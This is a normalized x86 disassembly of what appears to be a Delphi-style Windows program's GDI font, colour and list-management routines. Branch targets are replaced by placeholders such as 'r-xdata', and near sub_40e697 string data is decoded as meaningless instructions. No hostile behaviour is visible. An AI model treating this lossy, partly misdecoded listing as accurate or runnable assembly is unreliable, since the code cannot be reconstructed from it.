pop [ fs : 0x0 ]
add esp 0xc
sub_40dc9c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_40dbd4
mov [ ebp - 0xe ] ax
mov eax [ ebp - 0x4 ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40dd91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov ax [ eax + 0xc ]
cmp ax [ ebp - 0xe ]
jne r-xdata
mov eax [ ebp - 0xc ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd98
mov eax [ ebp - 0x4 ]
call sub_40dc84
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_44ba5c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov dx [ ebp - 0xe ]
mov [ eax + 0xc ] dx
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_44bbe8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
add eax 0x10
call sub_4461ec
test al al
je r-xdata
sub_40dda0
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40de3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0xd ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40dc84
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
sub_40de6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40dee4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40dc9c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40dda0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40deeb
mov eax [ ebp - 0x4 ]
call sub_40dc84
retn
mov eax [ ebp - 0x8 ]
mov bx 0xfffd
call sub_44c24c
sub_40def0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40df63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df6a
mov eax [ ebp - 0x4 ]
call sub_40dc84
retn
mov eax [ ebp - 0xc ]
inc [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov bx 0xfffd
call sub_44c24c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40dda0
sub_40df70
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40dfee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dff5
mov eax [ ebp - 0x4 ]
call sub_40dc84
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
jge r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call DeleteObject
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
sub_40dffc
push ebp
mov ebp esp
add esp 0xffffffec
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40e0ab
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_40f8a4
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_40fc6c
push ebp
mov eax [ rw-data ]
call sub_40df70
pop ecx
push ebp
mov eax [ rw-data ]
call sub_40df70
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0b2
mov eax [ ebp - 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43c464
call sub_40fab8
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_40e410
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
and eax 0xff
push eax
call GetSysColor
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40e440
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x29
mov ecx rw-data
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43be9c
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_40e468
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x29
mov ecx rw-data
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43be3c
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_40e490
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_40e4b4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
call EnterCriticalSection
sub_40e4d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
call LeaveCriticalSection
sub_40e697
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x11
mov ecx rw-data
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43be9c
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_40e6d0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x11
mov ecx rw-data
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43be3c
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_40e6f8
push ebp
mov ebp esp
add esp 0xffffff98
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edi eax
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x44 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
cmp [ ebp - 0x34 ] 0x2bc
jl r-xdata
cmp [ ebp - 0x30 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x9 ] 0x1
cmp [ ebp - 0x2f ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x9 ] 0x2
cmp [ ebp - 0x2e ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x9 ] 0x4
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x2d ]
mov [ eax + 0xa ] dl
lea eax [ ebp - 0x68 ]
lea edx [ ebp - 0x28 ]
mov ecx 0x20
call sub_44be94
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x8 ]
add eax 0xb
mov cl 0x1f
call sub_44bc6c
mov al [ ebp - 0x29 ]
and al 0xf
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x9 ] 0x8
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
sub_40e7d8
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_40dc9c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x80000008
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40e840
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ rw-data ]
call sub_40dda0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_40e874
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40e490
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_40e89c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40e95e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40e941
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40def0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40e9f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e948
mov eax [ ebp - 0x8 ]
call sub_40e4d4
retn
mov eax [ ebp - 0x8 ]
call sub_40ecd4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_40ed00
sub_40e974
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_40e9a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40e9ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40de6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9f3
mov eax [ ebp - 0x4 ]
call sub_40e4d4
retn
sub_40e9f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
sub_40ea2c
push ebp
mov ebp esp
add esp 0xffffffac
xor edx edx
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ebbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebc3
lea eax [ ebp - 0x54 ]
mov edx 0x3
call sub_44cb04
retn
mov eax [ rw-data ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40eb91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_40dc84
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x48 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x38 ] 0x190
mov [ ebp - 0x38 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0xc ]
add edx 0x1b
call sub_44cd04
mov edx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
call sub_446894
lea eax [ ebp - 0x50 ]
mov edx rw-data
call sub_44cd04
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
call sub_446894
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x34 ] al
mov eax [ ebp - 0xc ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x33 ] al
mov eax [ ebp - 0xc ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x32 ] al
mov eax [ ebp - 0xc ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x31 ] al
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0xc ]
add edx 0x1b
call sub_44cd04
mov eax [ ebp - 0x4c ]
mov edx r-xdata
call sub_4462cc
test eax eax
jne r-xdata
mov [ ebp - 0x2d ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x2e ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2f ] 0x0
mov eax [ ebp - 0x4 ]
call sub_40ed78
dec al
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x2d ] 0x0
sub_40ebdc
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_40e6f8
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e9a4
mov esp ebp
pop ebp
retn
sub_40ec04
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40ec20
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e974
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e9a4
mov esp ebp
pop ebp
retn
sub_40ec4c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
add edx 0x1b
call sub_44cd04
pop ecx
pop ecx
pop ebp
retn
sub_40ec70
push ebp
mov ebp esp
add esp 0xfffffecc
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e974
lea eax [ ebp - 0x29 ]
xor ecx ecx
mov edx 0x20
call sub_44bd90
lea eax [ ebp - 0x134 ]
mov edx [ ebp - 0x8 ]
mov ecx 0xff
call sub_44cd3c
lea edx [ ebp - 0x134 ]
lea eax [ ebp - 0x29 ]
mov cl 0x1f
call sub_44bc6c
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e9a4
sub_40ecd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
push eax
push 0x48
mov eax [ ebp - 0x4 ]
call sub_40ec04
push eax
call MulDiv
neg eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40ed00
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x48
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edx eax
neg edx
mov eax [ ebp - 0x4 ]
call sub_40ec20
pop ecx
pop ecx
pop ebp
retn
sub_40ed30
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x19 ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40ed4c
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e974
mov al [ ebp - 0x5 ]
mov [ ebp - 0x2b ] al
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e9a4
mov esp ebp
pop ebp
retn
sub_40ed78
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40ed94
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e974
mov al [ ebp - 0x5 ]
mov [ ebp - 0x2c ] al
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e9a4
mov esp ebp
pop ebp
retn
sub_40edc0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40eddc
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e974
mov al [ ebp - 0x5 ]
mov [ ebp - 0x2a ] al
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_40e9a4
mov esp ebp
pop ebp
retn
sub_40ee08
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_40dc9c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x4
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40ee5c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ rw-data ]
call sub_40dda0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_40ee90
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40ef32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40ef15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40def0
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40f0b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef1c
mov eax [ ebp - 0x8 ]
call sub_40e4d4
retn
sub_40ef48
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_40ef78
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40efc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40de6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40efc7
mov eax [ ebp - 0x4 ]
call sub_40e4d4
retn
sub_40efcc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40efe8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40ef48
mov eax [ ebp - 0x8 ]
